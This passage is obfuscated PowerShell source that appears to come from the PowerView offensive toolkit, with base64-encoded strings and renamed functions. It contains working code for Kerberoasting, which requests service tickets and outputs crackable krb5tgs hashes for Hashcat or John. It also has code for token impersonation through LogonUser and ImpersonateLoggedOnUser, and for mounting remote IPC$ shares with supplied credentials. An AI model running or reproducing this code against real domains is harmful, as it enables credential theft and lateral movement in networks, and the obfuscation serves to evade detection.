                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAB1AHMAaQBuAGcAIABhAGwAdABlAHIAbgBhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgADoAIAAkAF8A')))
                }
            }
            else {
                try {
                    $Null = f120 ${539} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (
                        ${541},
                        ${540}
                    )
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AC0AQQBEAE4AYQBtAGUAXQAgAEUAcgByAG8AcgAgAGkAbgBpAHQAaQBhAGwAaQB6AGkAbgBnACAAdAByAGEAbgBzAGwAYQB0AGkAbwBuACAAZgBvAHIAIAAnACQASQBkAGUAbgB0AGkAdAB5ACcAIAA6ACAAJABfAA==')))
                }
            }
            f121 ${539} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
            try {
                $Null = f120 ${539} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (8, ${434})
                f120 ${539} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (${538})
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '${434}' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function ConvertFrom-UACValue {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        ${177},
        [Switch]
        $ShowAll
    )
    BEGIN {
        ${537} = New-Object System.Collections.Specialized.OrderedDictionary
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        ${537}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    PROCESS {
        ${536} = New-Object System.Collections.Specialized.OrderedDictionary
        if ($ShowAll) {
            ForEach (${457} in ${537}.GetEnumerator()) {
                if ( (${177} -band ${457}.Value) -eq ${457}.Value) {
                    ${536}.Add(${457}.Name, "$(${457}.Value)+")
                }
                else {
                    ${536}.Add(${457}.Name, "$(${457}.Value)")
                }
            }
        }
        else {
            ForEach (${457} in ${537}.GetEnumerator()) {
                if ( (${177} -band ${457}.Value) -eq ${457}.Value) {
                    ${536}.Add(${457}.Name, "$(${457}.Value)")
                }
            }
        }
        ${536}
    }
}
function f110 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] -or ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA'))))) {
            if ($Identity -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgArAFwAXAAuACsA')))) {
                ${535} = $Identity | f111 -f40 Canonical
                if (${535}) {
                    ${534} = ${535}.SubString(0, ${535}.IndexOf('/'))
                    ${532} = $Identity.Split('\')[1]
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJAB7ADUAMwA0AH0AJwA=')))
                }
            }
            else {
                ${532} = $Identity
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEIAaQBuAGQAaQBuAGcAIAB0AG8AIABkAG8AbQBhAGkAbgAgACcAJABEAG8AbQBhAGkAbgAnAA==')))
                ${534} = $Domain
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${405} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${534}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${405} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${534})
            }
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAFUAcwBpAG4AZwAgAGEAbAB0AGUAcgBuAGEAdABlACAAYwByAGUAZABlAG4AdABpAGEAbABzAA==')))
                ${533} = f69 | select -ExpandProperty Name
                ${405} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, ${533}, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                ${405} = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            ${532} = $Identity
        }
        ${179} = New-Object PSObject
        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdAA='))) ${405}
        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA=='))) ${532}
        ${179}
    }
    catch {
        Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFAAcgBpAG4AYwBpAHAAYQBsAEMAbwBuAHQAZQB4AHQAXQAgAEUAcgByAG8AcgAgAGMAcgBlAGEAdABpAG4AZwAgAGIAaQBuAGQAaQBuAGcAIABmAG8AcgAgAG8AYgBqAGUAYwB0ACAAKAAnACQASQBkAGUAbgB0AGkAdAB5ACcAKQAgAGMAbwBuAHQAZQB4AHQAIAA6ACAAJABfAA==')))
    }
}
function f93 {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential
    )
    BEGIN {
        ${531} = [Activator]::CreateInstance(${9})
        ${531}.dwType = 1
    }
    PROCESS {
        ${530} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${259} in ${94}) {
                ${259} = ${259}.Trim('\')
                ${530} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAyADUAOQB9AFwASQBQAEMAJAA=')))
            }
        }
        else {
            ${530} += ,$Path
        }
        ForEach (${154} in ${530}) {
            ${531}.lpRemoteName = ${154}
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBBAGQAZAAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIABtAG8AdQBuAHQAOgAgACQAewAxADUANAB9AA==')))
            ${58} = ${3}::WNetAddConnection2W(${531}, $Credential.GetNetworkCredential().Password, $Credential.UserName, 4)
            if (${58} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANQA0AH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAG0AbwB1AG4AdABlAGQA')))
            }
            else {
                Throw "[Add-RemoteConnection] error mounting ${154} : $(([ComponentModel.Win32Exception]${58}).Message)"
            }
        }
    }
}
function f91 {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${94},
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        ${530} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ForEach (${259} in ${94}) {
                ${259} = ${259}.Trim('\')
                ${530} += ,$ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewAyADUAOQB9AFwASQBQAEMAJAA=')))
            }
        }
        else {
            ${530} += ,$Path
        }
        ForEach (${154} in ${530}) {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAbQBvAHYAZQAtAFIAZQBtAG8AdABlAEMAbwBuAG4AZQBjAHQAaQBvAG4AXQAgAEEAdAB0AGUAbQBwAHQAaQBuAGcAIAB0AG8AIAB1AG4AbQBvAHUAbgB0ADoAIAAkAHsAMQA1ADQAfQA=')))
            ${58} = ${3}::WNetCancelConnection2(${154}, 0, $True)
            if (${58} -eq 0) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEANQA0AH0AIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAHUAbQBtAG8AdQBuAHQAZQBkAA==')))
            }
            else {
                Throw "[Remove-RemoteConnection] error unmounting ${154} : $(([ComponentModel.Win32Exception]${58}).Message)"
            }
        }
    }
}
function f77 {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        ${f2},
        [Switch]
        ${f39}
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAEEA')))) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGkAZQB0AA==')))])) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAaQBzACAAbgBvAHQAIABjAHUAcgByAGUAbgB0AGwAeQAgAGkAbgAgAGEAIABzAGkAbgBnAGwAZQAtAHQAaAByAGUAYQBkAGUAZAAgAGEAcABhAHIAdABtAGUAbgB0ACAAcwB0AGEAdABlACwAIAB0AG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAbQBhAHkAIABuAG8AdAAgAHcAbwByAGsALgA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        ${528} = ${f2}
    }
    else {
        ${528} = [IntPtr]::Zero
        ${529} = $Credential.GetNetworkCredential()
        $UserDomain = ${529}.Domain
        ${120} = ${529}.UserName
        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$(${120})"
        ${58} = ${5}::LogonUser(${120}, $UserDomain, ${529}.Password, 9, 3, [ref]${528});${64} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not ${58}) {
            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
        }
    }
    ${58} = ${5}::ImpersonateLoggedOnUser(${528})
    if (-not ${58}) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFUAcwBlAHIASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBdACAAQQBsAHQAZQByAG4AYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABzAHUAYwBjAGUAcwBzAGYAdQBsAGwAeQAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAZQBkAA==')))
    ${528}
}
function f75 {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${f2}
    )
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAGsAZQBuAEgAYQBuAGQAbABlAA==')))]) {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABSAGUAdgBlAHIAdABpAG4AZwAgAHQAbwBrAGUAbgAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4AIABhAG4AZAAgAGMAbABvAHMAaQBuAGcAIABMAG8AZwBvAG4AVQBzAGUAcgAoACkAIAB0AG8AawBlAG4AIABoAGEAbgBkAGwAZQA=')))
        ${58} = ${2}::CloseHandle(${f2})
    }
    ${58} = ${5}::RevertToSelf();${64} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not ${58}) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] ${64}).Message)"
    }
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBJAG4AdgBvAGsAZQAtAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmAF0AIABUAG8AawBlAG4AIABpAG0AcABlAHIAcwBvAG4AYQB0AGkAbwBuACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIAByAGUAdgBlAHIAdABlAGQA')))
}
function f119 {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        ${f29},
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAA=='))) })]
        [Object[]]
        ${f10},
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBJAGQAZQBuAHQAaQB0AHkATQBvAGQAZQBsAA=='))))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${85} = f77 -Credential $Credential
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
            ${422} = ${f10}
        }
        else {
            ${422} = ${f29}
        }
        ForEach ($Object in ${422}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))]) {
                ${527} = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                ${80} = $Object.DistinguishedName
            }
            else {
                ${527} = $Object
                $SamAccountName = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                ${80} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            }
            if (${527} -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                ${527} = ${527}[0]
            }
            try {
                ${521} = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ${527}
            }
            catch {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAUABOAFQAaQBjAGsAZQB0AF0AIABFAHIAcgBvAHIAIAByAGUAcQB1AGUAcwB0AGkAbgBnACAAdABpAGMAawBlAHQAIABmAG8AcgAgAFMAUABOACAAJwAkAHsANQAyADcAfQAnACAAZgByAG8AbQAgAHUAcwBlAHIAIAAnACQAewA4ADAAfQAnACAAOgAgACQAXwA=')))
            }
            if (${521}) {
                ${523} = ${521}.GetRequest()
            }
            if (${523}) {
                ${179} = New-Object PSObject
                ${526} = [System.BitConverter]::ToString(${523}) -replace '-'
                ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $SamAccountName
                ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${80}
                ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAHIAaQBuAGMAaQBwAGEAbABOAGEAbQBlAA=='))) ${521}.ServicePrincipalName
                if(${526} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQAzADgAMgAuAC4ALgAuADMAMAA4ADIALgAuAC4ALgBBADAAMAAzADAAMgAwADEAKAA/ADwARQB0AHkAcABlAEwAZQBuAD4ALgAuACkAQQAxAC4AewAxACwANAB9AC4ALgAuAC4ALgAuAC4AQQAyADgAMgAoAD8APABDAGkAcABoAGUAcgBUAGUAeAB0AEwAZQBuAD4ALgAuAC4ALgApAC4ALgAuAC4ALgAuAC4ALgAoAD8APABEAGEAdABhAFQAbwBFAG4AZAA+AC4AKwApAA==')))) {
                    ${522} = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    ${525} = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    ${524} = $Matches.DataToEnd.Substring(0,${525}*2)
                    if($Matches.DataToEnd.Substring(${525}*2, 4) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA0ADgAMgA=')))) {
                        Write-Warning "Error parsing ciphertext for the SPN  $(${521}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        ${520} = $null
                        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${523}).Replace('-',''))
                    } else {
                        ${520} = "$(${524}.Substring(0,32))`$$(${524}.Substring(32))"
                        ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $(${521}.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    ${520} = $null
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAGMAawBlAHQAQgB5AHQAZQBIAGUAeABTAHQAcgBlAGEAbQA='))) ([Bitconverter]::ToString(${523}).Replace('-',''))
                }
                if(${520}) {
                    if ($OutputFormat -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBvAGgAbgA=')))) {
                        ${519} = "`$krb5tgs`$$(${521}.ServicePrincipalName):${520}"
                    }
                    else {
                        if (${80} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))) {
                            $UserDomain = ${80}.SubString(${80}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
                        }
                        ${519} = "`$krb5tgs`$$(${522})`$*$SamAccountName`$$UserDomain`$$(${521}.ServicePrincipalName)*`$${520}"
                    }
                    ${179} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABhAHMAaAA='))) ${519}
                }
                ${179}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAFAATgBUAGkAYwBrAGUAdAA='))))
                ${179}
            }
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Invoke-Kerberoast {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${110} = @{
            'SPN' = $True
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
